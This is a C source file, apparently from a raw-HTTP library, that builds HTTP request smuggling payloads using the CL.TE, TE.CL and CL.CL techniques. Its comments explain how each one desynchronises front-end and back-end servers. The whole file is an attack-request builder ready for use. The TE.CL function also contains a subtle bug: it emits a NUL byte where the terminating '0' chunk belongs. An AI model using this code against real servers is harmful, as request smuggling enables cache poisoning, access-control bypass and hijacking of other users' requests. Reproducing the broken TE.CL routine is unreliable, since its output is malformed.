#include "rawhttp_/smuggle.h"

#include <stdio.h>
#include <string.h> 

#define RH_APPEND_LIT(out, lit)                                         \
    do                                                                  \
    {                                                                   \
        rh_err _e = rh_buf_append((out), (lit), sizeof(lit)-1);         \
        if (_e != RH_OK) return _e;                                     \
    } while (0)                                                         \

#define RH_APPEND_STR(out, str)                                         \
    do                                                                  \
    {                                                                   \
        rh_err _e = rh_buf_append((out), (str), strlen(str));           \
        if (_e != RH_OK) return _e;                                     \
    } while (0)                                                         \

static rh_err append_uint(rh_buf *out, unsigned long long v)
{
    char buf[32];
    int n = snprintf(buf, sizeof(buf), "%llu", v);
    if (n < 0 || (size_t)n >= sizeof(buf)) return RH_ERR_INVAL;
    return rh_buf_append(out, buf, (size_t)n);
}

rh_err rh_smuggle_parse_technique(const char *name, rh_smuggle_technique *out)
{
    if (!name || !out) return RH_ERR_INVAL;
    if (strcmp(name, "cl.te") == 0 || strcmp(name, "CL.TE") == 0)
    {
        *out = RH_SMUGGLE_CL_TE;
        return RH_OK;
    }
    if (strcmp(name, "te.cl") == 0 || strcmp(name, "TE.CL") == 0)
    {
        *out = RH_SMUGGLE_TE_CL;
        return RH_OK;
    }
    if (strcmp(name, "cl.cl") == 0 || strcmp(name, "CL.CL") == 0)
    {
        *out = RH_SMUGGLE_CL_CL;
        return RH_OK;
    }
    return RH_ERR_PARSE;
}

/*
 * CL.TE: front-end honors Content-Length and forwards exactly that many body bytes 
 * to the back-end; back-end honors Transfer-Encoding and stops at the terminating 0-length
 * chunk, leaving anything after it buffered as the start of the NEXT request it reads off
 * the connection - that's `smuggled`. 
 * */

static rh_err build_cl_te(const char *host_header, const char *path, const char *smuggled,
                        long cl1_override, rh_buf *out)
{
    static const char terminator[] = "0\r\n\r\n"; /* zero-length chunk = end of chunked body  */
    unsigned long long cl = cl1_override >= 0 ? (unsigned long long) cl1_override 
                                            : (sizeof(terminator)-1) + strlen(smuggled);
    RH_APPEND_LIT(out, "POST ");
    RH_APPEND_STR(out, path);
    RH_APPEND_LIT(out, " HTTP/1.1\r\nHost: ");
    RH_APPEND_STR(out, host_header);
    RH_APPEND_LIT(out, "\r\nContent-Length: ");
    
    rh_err e = append_uint(out, cl);
    if (e != RH_OK) return e;
    
    RH_APPEND_LIT(out, "\r\nTransfer-Encoding: chunked\r\n\r\n");
    RH_APPEND_LIT(out, terminator);
    RH_APPEND_STR(out, smuggled);

    return RH_OK;
}

/*
 * TE.CL: front-end honors Transfer-Encoding and processes the whole chunked body 
 * (one real chunk containing `smuggled`, then the terminating chunk); back-end honors 
 * Content-Length and reads only that many bytes - just enough to consume the chunk-size
 * line itself - leaving "{smuggled}\r\n\0\r\n\r\n" as the start of the next request it 
 * parses.
 * */

static rh_err build_te_cl(const char *host_header, const char *path, const char *smuggled,
                        long cl1_override, rh_buf *out)
{
    char hex_len[32];
    int hn = snprintf(hex_len, sizeof(hex_len), "%zx", strlen(smuggled));
    if (hn < 0 || (size_t)hn >= sizeof(hex_len)) return RH_ERR_INVAL;

    /* default CL = just enough to consume "{hex_len}\r\n" and nothing more */
    unsigned long long cl = cl1_override >= 0 ? (unsigned long long)cl1_override 
                                            : (unsigned long long)hn+2;

    RH_APPEND_LIT(out, "POST ");
    RH_APPEND_STR(out, path);
    RH_APPEND_LIT(out, " HTTP/1.1\r\nHost: ");
    RH_APPEND_STR(out, host_header);
    RH_APPEND_LIT(out, "\r\nContent-Length: ");

    rh_err e = append_uint(out, cl);
    if (e != RH_OK) return e;

    RH_APPEND_LIT(out, "\r\nTransfer-Encoding: chunked\r\n\r\n");
    RH_APPEND_STR(out, hex_len);
    RH_APPEND_LIT(out, "\r\n");
    RH_APPEND_STR(out, smuggled);
    RH_APPEND_LIT(out, "\r\n\0\r\n\r\n");

    return RH_OK;
}

/*
 * CL.CL two Content-Length headers with (by default) the same, correct value - the 
 * techinque only does anything once the caller overrides one of them to disagree, which
 * is exactly why both are independently overridable rather than this function picking a
 * "sensible" mismatch on the caller's behalf.
 * */
static rh_err build_cl_cl(const char *host_header, const char *path, const char *smuggled,
                        long cl1_override, long cl2_override, rh_buf *out)
{
    unsigned long long body_len = strlen(smuggled);
    unsigned long long cl1 = cl1_override >= 0 ? (unsigned long long)cl1_override : body_len;
    unsigned long long cl2 = cl2_override >= 0 ? (unsigned long long)cl2_override : body_len;
    
    RH_APPEND_LIT(out, "POST ");
    RH_APPEND_STR(out, path);
    RH_APPEND_LIT(out, " HTTP/1.1\r\nHost: ");
    RH_APPEND_STR(out, host_header);
    RH_APPEND_LIT(out, "\r\nContent-Length: ");
    
    rh_err e = append_uint(out, cl1);
    if (e != RH_OK) return e;

    RH_APPEND_LIT(out, "\r\nContent-Length: ");

    e = append_uint(out, cl2);
    if (e != RH_OK) return e;

    RH_APPEND_LIT(out, "\r\n\r\n");
    RH_APPEND_STR(out, smuggled);

    return RH_OK;
}

rh_err rh_smuggle_build(rh_smuggle_technique technique, const char *host_header, const char *path, const char *smuggled, long cl1_override, long cl2_override, rh_buf *out)
{
    if (!host_header || !path || !smuggled || !*smuggled || !out) return RH_ERR_INVAL;

    rh_err e = rh_buf_init(out, 0);
    if (e != RH_OK) return e;

    switch (technique)
    {
        case RH_SMUGGLE_CL_TE:
            e = build_cl_te(host_header, path, smuggled, cl1_override, out);
            break;
        case RH_SMUGGLE_TE_CL:
            e = build_te_cl(host_header, path, smuggled, cl1_override, out);
            break;
        case RH_SMUGGLE_CL_CL:
            e = build_cl_cl(host_header, path, smuggled, cl1_override, cl2_override, out);
            break;
        default:
            e = RH_ERR_INVAL;
            break;
    }
    
    if (e != RH_OK) rh_buf_free(out);
    return e;
}

#undef RH_APPEND_LIT
#undef RH_APPEND_STR
